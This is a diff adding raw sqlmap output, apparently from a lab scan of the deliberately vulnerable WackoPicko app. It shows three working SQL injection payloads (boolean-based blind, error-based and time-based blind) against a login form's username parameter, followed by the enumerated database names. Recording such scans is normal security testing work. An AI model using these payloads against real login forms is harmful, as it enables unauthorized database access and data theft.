@@ -1,0 +1,20 @@
+sqlmap identified the following injection point(s) with a total of 359 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: username=FUZZ' AND 7401=(SELECT (CASE WHEN (7401=7401) THEN 7401 ELSE (SELECT 6686 UNION SELECT 8582) END))-- -&password=FUZZ
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: username=FUZZ' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162627171,(SELECT (ELT(2254=2254,1))),0x71707a7171,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'VGQy'='VGQy&password=FUZZ
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=FUZZ' AND (SELECT 6181 FROM (SELECT(SLEEP(5)))fQUU) AND 'ofiv'='ofiv&password=FUZZ
+---
+back-end DBMS: MySQL >= 5.5
+available databases [2]:
+[*] information_schema
+[*] wackopicko
+
